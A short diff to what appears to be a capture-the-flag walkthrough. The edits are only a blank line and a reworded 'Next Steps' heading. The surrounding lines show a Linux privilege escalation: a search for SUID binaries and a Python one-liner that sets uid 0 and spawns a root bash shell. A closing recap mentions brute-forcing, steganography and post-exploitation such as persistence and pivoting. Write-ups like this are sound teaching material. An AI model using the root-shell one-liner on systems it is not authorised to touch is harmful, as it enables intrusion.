@@ -118,6 +118,7 @@ Search for SUID binaries:
 find / -perm -4000 2>/dev/null
 You may find a vulnerable binary (example: /usr/bin/python with SUID bit set).
 Exploit it for root shell:
+
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 Confirm root access:
 whoami
@@ -133,7 +134,7 @@ Directory brute-forcing
 Steganography to extract hidden credentials
 Web login → user foothold
 Privilege escalation to root
-Next Steps:
+🔮 Next Steps
 Practice automating parts of this process.
 Try alternative privilege escalation methods.
 Explore post-exploitation activities (persistence, pivoting, etc.).
